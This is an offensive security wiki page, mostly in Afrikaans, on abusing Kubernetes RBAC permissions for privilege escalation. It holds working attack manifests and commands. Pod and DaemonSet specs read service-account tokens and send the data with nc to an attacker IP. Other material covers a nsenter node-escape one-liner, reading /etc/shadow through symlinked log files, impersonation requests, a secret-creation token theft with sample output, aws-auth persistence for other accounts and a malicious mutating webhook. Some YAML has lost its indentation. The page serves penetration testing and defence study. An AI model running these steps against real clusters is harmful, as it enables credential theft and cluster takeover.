# Misbruik van Rolle/ClusterRolle in Kubernetes

{{#include ../../../banners/hacktricks-training.md}}

Hier kan jy 'n paar potensieel gevaarlike Rolle en ClusterRolle konfigurasies vind.\
Onthou dat jy al die ondersteunde hulpbronne kan kry met `kubectl api-resources`

## **Privilegie Eskalasie**

Verwys na die kuns om **toegang te verkry tot 'n ander prinsiep** binne die kluster **met verskillende voorregte** (binne die kubernetes kluster of na eksterne wolke) as diegene wat jy reeds het, in Kubernetes is daar basies **4 hoof tegnieke om voorregte te eskaleer**:

- In staat wees om **te verteenwoordig** ander gebruikers/groepe/SAs met beter voorregte binne die kubernetes kluster of na eksterne wolke
- In staat wees om **te skep/patch/exec pods** waar jy **SAs kan vind of aanheg** met beter voorregte binne die kubernetes kluster of na eksterne wolke
- In staat wees om **geheime te lees** aangesien die SAs tokens as geheime gestoor word
- In staat wees om **te ontsnap na die node** vanaf 'n houer, waar jy al die geheime van die houers wat in die node loop, die akrediteer van die node, en die toestemmings van die node binne die wolk waarin dit loop (indien enige)
- 'n Vyfde tegniek wat 'n vermelding werd is, is die vermoë om **port-forward** in 'n pod te laat loop, aangesien jy dalk toegang kan verkry tot interessante hulpbronne binne daardie pod.

### Toegang tot Enige Hulpbron of Werkwoord (Wildcard)

Die **wildcard (\*) gee toestemming oor enige hulpbron met enige werkwoord**. Dit word deur admins gebruik. Binne 'n ClusterRole beteken dit dat 'n aanvaller enigenamespace in die kluster kan misbruik
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Toegang tot Enige Hulpbron met 'n spesifieke werkwoord

In RBAC bied sekere toestemmings beduidende risiko's:

1. **`create`:** Gee die vermoë om enige klusterhulpbron te skep, wat die risiko van privilige-eskalasie inhou.
2. **`list`:** Laat die lys van alle hulpbronne toe, wat moontlik sensitiewe data kan lek.
3. **`get`:** Laat toegang tot geheime van diensrekeninge toe, wat 'n sekuriteitsbedreiging inhou.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Skep - Steel Token

'n Aanvaller met die regte om 'n pod te skep, kan 'n bevoorregte Diensrekening aan die pod heg en die token steel om die Diensrekening na te boots. Effektief die bevoegdhede na hom te verhoog.

Voorbeeld van 'n pod wat die token van die `bootstrap-signer` diensrekening sal steel en dit na die aanvaller sal stuur:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Skep & Ontsnapping

Die volgende dui al die voorregte aan wat 'n houer kan hê:

- **Bevoorregte toegang** (deaktiveer beskermings en stel vermoëns in)
- **Deaktiveer namespaces hostIPC en hostPid** wat kan help om voorregte te verhoog
- **Deaktiveer hostNetwork** namespace, wat toegang gee om nodes se wolkvoorregte te steel en beter toegang tot netwerke te verkry
- **Monteer gashere / binne die houer**
```yaml:super_privs.yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
Skep die pod met:
```bash
kubectl --token $token create -f mount_root.yaml
```
Een-liner van [hierdie tweet](https://twitter.com/mauilion/status/1129468485480751104) en met 'n paar toevoegings:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Now that you can escape to the node check post-exploitation techniques in:

#### Stealth

You probably want to be **stealthier**, in the following pages you can see what you would be able to access if you create a pod only enabling some of the mentioned privileges in the previous template:

- **Privileged + hostPID**
- **Privileged only**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_You can find example of how to create/abuse the previous privileged pods configurations in_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - Move to cloud

If you can **create** a **pod** (and optionally a **service account**) you might be able to **obtain privileges in cloud environment** by **assigning cloud roles to a pod or a service account** and then accessing it.\
Moreover, if you can create a **pod with the host network namespace** you can **steal the IAM** role of the **node** instance.

For more information check:

{{#ref}}
pod-escape-privileges.md
{{#endref}}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

It's possible to abouse these permissions to **create a new pod** and estalae privileges like in the previous example.

The following yaml **creates a daemonset and exfiltrates the token of the SA** inside the pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** is 'n hulpbron in kubernetes wat gebruik word om **opdragte in 'n skulp binne 'n pod te loop**. Dit maak dit moontlik om **opdragte binne die houers te loop of 'n skulp binne te kry**.

Daarom is dit moontlik om **binne 'n pod te kom en die token van die SA te steel**, of om 'n bevoorregte pod binne te gaan, na die node te ontsnap, en al die tokens van die pods in die node te steel en (ab)gebruik te maak van die node:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Hierdie toestemming laat toe om **een plaaslike poort na een poort in die gespesifiseerde pod te stuur**. Dit is bedoel om dit maklik te maak om toepassings wat binne 'n pod loop te debug, maar 'n aanvaller mag dit misbruik om toegang te verkry tot interessante (soos DB's) of kwesbare toepassings (webs?) binne 'n pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

Soos [**aange dui in hierdie navorsing**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), as jy toegang het tot of 'n pod kan skep met die **hosts `/var/log/` gids gemonteer** daarop, kan jy **uit die houer ontsnap**.\
Dit is basies omdat wanneer die **Kube-API probeer om die logs** van 'n houer te kry (met `kubectl logs <pod>`), dit **die `0.log`** lêer van die pod aanvra deur die `/logs/` eindpunt van die **Kubelet** diens.\
Die Kubelet diens stel die `/logs/` eindpunt bloot wat basies net die **`/var/log` lêerstelsel van die houer** blootstel.

Daarom kan 'n aanvaller met **toegang om in die /var/log/ gids** van die houer te skryf, hierdie gedrag op 2 maniere misbruik:

- Om die `0.log` lêer van sy houer (gewoonlik geleë in `/var/logs/pods/namespace_pod_uid/container/0.log`) te wysig om 'n **symlink wat na `/etc/shadow`** wys te wees, byvoorbeeld. Dan sal jy in staat wees om die hosts se skadu lêer te exfiltreer deur:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
- As die aanvaller enige hoofrol met die **regte om `nodes/log` te lees**, kan hy eenvoudig 'n **symlink** in `/host-mounted/var/log/sym` na `/` skep en wanneer **hy toegang verkry tot `https://<gateway>:10250/logs/sym/` sal hy die gashere se wortel** lêerstelsel lys (die verandering van die symlink kan toegang tot lêers bied).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**'n Laboratorium en geoutomatiseerde eksploit kan gevind word in** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Om te verbygaan readOnly beskerming <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

As jy gelukkig genoeg is en die hoogs bevoorregte vermoë `CAP_SYS_ADMIN` beskikbaar is, kan jy net die gids as rw hermonteer:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypass van hostPath readOnly beskerming <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Soos vermeld in [**hierdie navorsing**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) is dit moontlik om die beskerming te omseil:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Wat bedoel was om ontsnapings soos die vorige te voorkom deur, in plaas van 'n hostPath-mount te gebruik, 'n PersistentVolume en 'n PersistentVolumeClaim te gebruik om 'n gasheer se gids in die houer met skryftoegang te monteer:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: ["sh", "-c", "sleep 1h"]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonering van bevoorregte rekeninge**

Met 'n [**gebruikersimpersonering**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) voorreg, kan 'n aanvaller 'n bevoorregte rekening impersoner. 

Gebruik eenvoudig die parameter `--as=<username>` in die `kubectl` opdrag om 'n gebruiker te impersoner, of `--as-group=<group>` om 'n groep te impersoner:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Of gebruik die REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Lys van Geheime

Die toestemming om **geheime te lys kan 'n aanvaller in staat stel om werklik die geheime te lees** deur toegang te verkry tot die REST API-eindpunt:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Skep en Lees Geheimen

Daar is 'n spesiale soort Kubernetes geheim van tipe **kubernetes.io/service-account-token** wat serviceaccount tokens stoor. 
As jy toestemmings het om geheimen te skep en te lees, en jy weet ook die serviceaccount se naam, kan jy 'n geheim soos volg skep en dan die slagoffer se serviceaccount token daaruit steel:
```yaml
apiVersion: v1
kind: Secret
metadata:
name: stolen-admin-sa-token
namespace: default
annotations:
kubernetes.io/service-account.name: cluster-admin-sa
type: kubernetes.io/service-account-token
```
Voorbeeld uitbuiting:
```bash
$ SECRETS_MANAGER_TOKEN=$(kubectl create token secrets-manager-sa)

$ kubectl auth can-i --list --token=$SECRETS_MANAGER_TOKEN
Warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
secrets                                         []                                     []               [get create]
[/.well-known/openid-configuration/]   []               [get]
<SNIP>
[/version]                             []               [get]

$ kubectl create token cluster-admin-sa --token=$SECRETS_MANAGER_TOKEN
error: failed to create token: serviceaccounts "cluster-admin-sa" is forbidden: User "system:serviceaccount:default:secrets-manager-sa" cannot create resource "serviceaccounts/token" in API group "" in the namespace "default"

$ kubectl get pods --token=$SECRETS_MANAGER_TOKEN --as=system:serviceaccount:default:secrets-manager-sa
Error from server (Forbidden): serviceaccounts "secrets-manager-sa" is forbidden: User "system:serviceaccount:default:secrets-manager-sa" cannot impersonate resource "serviceaccounts" in API group "" in the namespace "default"

$ kubectl apply -f ./secret-that-steals-another-sa-token.yaml --token=$SECRETS_MANAGER_TOKEN
secret/stolen-admin-sa-token created

$ kubectl get secret stolen-admin-sa-token --token=$SECRETS_MANAGER_TOKEN -o json
{
"apiVersion": "v1",
"data": {
"ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FU<SNIP>UlRJRklDQVRFLS0tLS0K",
"namespace": "ZGVmYXVsdA==",
"token": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWk<SNIP>jYkowNWlCYjViMEJUSE1NcUNIY0h4QTg2aXc="
},
"kind": "Secret",
"metadata": {
"annotations": {
"kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"kubernetes.io/service-account.name\":\"cluster-admin-sa\"},\"name\":\"stolen-admin-sa-token\",\"namespace\":\"default\"},\"type\":\"kubernetes.io/service-account-token\"}\n",
"kubernetes.io/service-account.name": "cluster-admin-sa",
"kubernetes.io/service-account.uid": "faf97f14-1102-4cb9-9ee0-857a6695973f"
},
"creationTimestamp": "2025-01-11T13:02:27Z",
"name": "stolen-admin-sa-token",
"namespace": "default",
"resourceVersion": "1019116",
"uid": "680d119f-89d0-4fc6-8eef-1396600d7556"
},
"type": "kubernetes.io/service-account-token"
}
```
Let daarop dat as jy toegelaat word om geheime in 'n sekere naamruimte te skep en te lees, die slagoffer diensrekening ook in daardie naamruimte moet wees.

### Lees 'n geheim – brute-forcing token ID's

Terwyl 'n aanvaller in besit van 'n token met leesregte die presiese naam van die geheim benodig om dit te gebruik, in teenstelling met die breër _**lys geheime**_ voorreg, is daar steeds kwesbaarhede. Standaard diensrekeninge in die stelsel kan opgenoem word, elk geassosieer met 'n geheim. Hierdie geheime het 'n naamstruktuur: 'n statiese voorvoegsel gevolg deur 'n ewekansige vyf-karakter alfanumeriese token (uitgesluit sekere karakters) volgens die [bronkode](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Die token word gegenereer uit 'n beperkte 27-karakter stel (`bcdfghjklmnpqrstvwxz2456789`), eerder as die volle alfanumeriese reeks. Hierdie beperking verminder die totale moontlike kombinasies tot 14,348,907 (27^5). Gevolglik kan 'n aanvaller haalbaar 'n brute-force aanval uitvoer om die token binne 'n paar uur af te lei, wat moontlik kan lei tot voorregverhoging deur toegang tot sensitiewe diensrekeninge.

### Sertifikaat Handtekening Versoeke

As jy die werkwoorde **`create`** in die hulpbron `certificatesigningrequests` (of ten minste in `certificatesigningrequests/nodeClient`) het. Jy kan **create** 'n nuwe CeSR van 'n **nuwe node.**

Volgens die [dokumentasie is dit moontlik om hierdie versoeke outomaties goed te keur](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), so in daardie geval het jy **nie ekstra regte nodig nie**. As nie, sal jy in staat moet wees om die versoek goed te keur, wat beteken opdatering in `certificatesigningrequests/approval` en `approve` in `signers` met resourceName `<signerNameDomain>/<signerNamePath>` of `<signerNameDomain>/*`

'n **voorbeeld van 'n rol** met al die vereiste regte is:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
So, met die nuwe node CSR goedgekeur, kan jy die spesiale toestemmings van nodes **misbruik** om **geheime** te **steel** en **privileges te verhoog**.

In [**hierdie pos**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) en [**hierdie een**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) is die GKE K8s TLS Bootstrap konfigurasie geconfigureer met **outomatiese ondertekening** en dit word misbruik om geloofsbriewe van 'n nuwe K8s Node te genereer en dan dit te misbruik om privileges te verhoog deur geheime te steel.\
As jy **die genoemde privileges het, kan jy dieselfde ding doen**. Let daarop dat die eerste voorbeeld die fout om 'n nuwe node te verhoed om geheime binne houers te benader, omseil omdat 'n **node slegs toegang kan hê tot die geheime van houers wat daarop gemonteer is.**

Die manier om dit te omseil, is net om **'n node-geloofsbrief te skep vir die nodenaam waar die houer met die interessante geheime gemonteer is** (maar kyk net hoe om dit in die eerste pos te doen):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Beginsels wat **`configmaps`** in die kube-system naamruimte op EKS (moet in AWS wees) klusters kan wysig, kan cluster admin voorregte verkry deur die **aws-auth** configmap te oorskryf.\
Die werkwoorde wat benodig word, is **`update`** en **`patch`**, of **`create`** as die configmap nie geskep is nie:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
> [!WARNING]
> Jy kan **`aws-auth`** gebruik vir **volharding** om toegang te gee aan gebruikers van **ander rekeninge**.
>
> egter, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **werk nie vanaf 'n ander rekening nie**. Maar eintlik werk `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` as jy die ARN van die kluster in plaas van net die naam sit.\
> Om `kubectl` te laat werk, maak net seker om die **slagoffers kubeconfig** te **konfigureer** en voeg in die aws exec args `--profile other_account_role` sodat kubectl die ander rekening se profiel sal gebruik om die token te kry en AWS te kontak.

### Escalating in GKE

Daar is **2 maniere om K8s toestemmings aan GCP prinsipes toe te ken**. In enige geval moet die prinsiep ook die toestemming **`container.clusters.get`** hê om in staat te wees om geloofsbriewe te versamel om toegang tot die kluster te verkry, of jy sal jou eie kubectl konfigurasie lêer moet **genereer** (volg die volgende skakel).

> [!WARNING]
> Wanneer daar met die K8s api eindpunt gepraat word, sal die **GCP auth token gestuur word**. Dan sal GCP, deur die K8s api eindpunt, eers **kontroleer of die prinsiep** (per e-pos) **enige toegang binne die kluster het**, dan sal dit kontroleer of dit **enige toegang via GCP IAM** het.\
> As **enige** van daardie **waar** is, sal hy **geantwoord** word. As **nie** nie, sal 'n **fout** wat voorstel om **toestemmings via GCP IAM** te gee, gegee word.

Dan is die eerste metode om **GCP IAM** te gebruik, die K8s toestemmings het hul **gelykwaardige GCP IAM toestemmings**, en as die prinsiep dit het, sal dit in staat wees om dit te gebruik.

{{#ref}}
../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md
{{#endref}}

Die tweede metode is om **K8s toestemmings binne die kluster toe te ken** deur die gebruiker te identifiseer deur sy **e-pos** (GCP diensrekeninge ingesluit).

### Create serviceaccounts token

Prinsipes wat **TokenRequests** (`serviceaccounts/token`) kan **skep** wanneer daar met die K8s api eindpunt gepraat word SAs (inligting van [**hier**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

Prinsipes wat **`update`** of **`patch`** **`pods/ephemeralcontainers`** kan **kode-uitvoering op ander pods** verkry, en potensieel **uitbreek** na hul node deur 'n ephemeral container met 'n bevoorregte securityContext by te voeg.

### ValidatingWebhookConfigurations or MutatingWebhookConfigurations

Prinsipes met enige van die werkwoorde `create`, `update` of `patch` oor `validatingwebhookconfigurations` of `mutatingwebhookconfigurations` mag in staat wees om **een van sulke webhookconfigurations te skep** om in staat te wees om **toestemmings te verhoog**.

Vir 'n [`mutatingwebhookconfigurations` voorbeeld kyk hierdie afdeling van hierdie pos](#malicious-admission-controller).

### Escalate

Soos jy in die volgende afdeling kan lees: [**Built-in Privileged Escalation Prevention**](#built-in-privileged-escalation-prevention), kan 'n prinsiep nie rolle of clusterroles opdateer of skep sonder om self daardie nuwe toestemmings te hê nie. Behalwe as hy die **werkwoord `escalate`** oor **`roles`** of **`clusterroles`** het.\
Dan kan hy nuwe rolle, clusterroles met beter toestemmings as diegene wat hy het, opdateer/skep.

### Nodes proxy

Prinsipes met toegang tot die **`nodes/proxy`** subbron kan **kode uitvoer op pods** via die Kubelet API (volgens [**hierdie**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Meer inligting oor Kubelet-authentisering op hierdie bladsy:

{{#ref}}
../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md
{{#endref}}

Jy het 'n voorbeeld van hoe om [**RCE te kry deur met 'n Kubelet API te praat hier**](../pentesting-kubernetes-services/index.html#kubelet-rce).

### Delete pods + unschedulable nodes

Prinsipes wat **pods kan verwyder** (`delete` werkwoord oor `pods` hulpbron), of **pods kan verplaas** (`create` werkwoord oor `pods/eviction` hulpbron), of **podstatus kan verander** (toegang tot `pods/status`) en kan **ander nodes ongeskeduleer maak** (toegang tot `nodes/status`) of **nodes kan verwyder** (`delete` werkwoord oor `nodes` hulpbron) en beheer oor 'n pod het, kan **pods van ander nodes steel** sodat hulle in die **gekompromitteerde** **node** uitgevoer word en die aanvaller kan **die tokens** van daardie pods **steel**.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
### Dienste status (CVE-2020-8554)

Beginsels wat **modifiseer** **`services/status`** kan die `status.loadBalancer.ingress.ip` veld stel om die **onopgeloste CVE-2020-8554** te benut en **MiTM-aanvalle teen die kluster** te loods. Meeste versagtings vir CVE-2020-8554 voorkom slegs ExternalIP dienste (volgens [**hierdie**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify_service_status_cve_2020_8554.rego)).

### Nodes en Pods status

Beginsels met **`update`** of **`patch`** toestemmings oor `nodes/status` of `pods/status`, kan etikette modifiseer om skeduleringsbeperkings te beïnvloed.

## Ingeboude Privilege Escalation Preventie

Kubernetes het 'n [ingeboude meganisme](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) om privilege escalasie te voorkom.

Hierdie stelsel verseker dat **gebruikers nie hul voorregte kan verhoog deur rolle of rolbindings te modifiseer**. Die afdwinging van hierdie reël vind op die API-vlak plaas, wat 'n beskerming bied selfs wanneer die RBAC-outeur inaktief is.

Die reël stipuleer dat 'n **gebruiker slegs 'n rol kan skep of opdateer as hulle al die toestemmings het wat die rol insluit**. Boonop moet die omvang van die gebruiker se bestaande toestemmings ooreenstem met dié van die rol wat hulle probeer skep of modifiseer: of dit kluster-wyd vir ClusterRoles of beperk tot dieselfde naamruimte (of kluster-wyd) vir Roles.

> [!WARNING]
> Daar is 'n uitsondering op die vorige reël. As 'n beginsel die **werkwoord `escalate`** oor **`roles`** of **`clusterroles`** het, kan hy die voorregte van rolle en clusterroles verhoog selfs sonder om die toestemmings self te hê.

### **Kry & Patch RoleBindings/ClusterRoleBindings**

> [!CAUTION]
> **Blykbaar het hierdie tegniek voorheen gewerk, maar volgens my toetse werk dit nie meer nie om dieselfde rede wat in die vorige afdeling verduidelik is. Jy kan nie 'n rolebinding skep/modifiseer om jouself of 'n ander SA sekere voorregte te gee as jy dit nie reeds het nie.**

Die voorreg om Rolebindings te skep, laat 'n gebruiker toe om **rolle aan 'n diensrekening te bind**. Hierdie voorreg kan potensieel lei tot voorregte escalasie omdat dit **die gebruiker toelaat om administratiewe voorregte aan 'n gecompromitteerde diensrekening te bind.**

## Ander Aanvalle

### Sidecar proxy app

Standaard is daar geen versleuteling in die kommunikasie tussen pods nie. Wederkerige verifikasie, twee-weg, pod na pod.

#### Skep 'n sidecar proxy app <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Skep jou .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Wysig jou .yaml en voeg die ontcommentaarde lyne by:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command:
[
"sh",
"-c",
"apt update && apt install iptables -y && iptables -L && sleep 1h",
]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Sien die logs van die proxy:
```bash
kubectl logs app -C proxy
```
Meer inligting by: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Kwaadwillige Toelatingsbeheerder

'n Toelatingsbeheerder **onderbreek versoeke na die Kubernetes API-bediener** voordat die persistensie van die objek, maar **nadat die versoek geverifieer** **en gemagtig** is.

As 'n aanvaller op een of ander manier daarin slaag om 'n **Mutationg Toelatingsbeheerder** te **injekteer**, sal hy in staat wees om **reeds geverifieerde versoeke te wysig**. Dit kan potensieel lei tot privesc, en meer gewoonlik om in die kluster te bly. 

**Voorbeeld van** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Kontroleer die status om te sien of dit gereed is:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format&format=webp)

Dan ontplooi 'n nuwe pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Wanneer jy die `ErrImagePull` fout kan sien, kyk na die beeldnaam met een van die navrae:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Soos wat jy in die bogenoemde beeld kan sien, het ons probeer om die beeld `nginx` te laat loop, maar die finale uitgevoerde beeld is `rewanthtammana/malicious-image`. Wat het net gebeur!!?

#### Tegniese Aspek <a href="#heading-technicalities" id="heading-technicalities"></a>

Die `./deploy.sh` skrip stel 'n muterende webhook toelatingsbeheerder in, wat versoeke na die Kubernetes API wysig soos gespesifiseer in sy konfigurasielyne, wat die waargenome uitkomste beïnvloed:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Die bogenoemde snit vervang die eerste houerbeeld in elke pod met `rewanthtammana/malicious-image`.

## OPA Gatekeeper omseiling

{{#ref}}
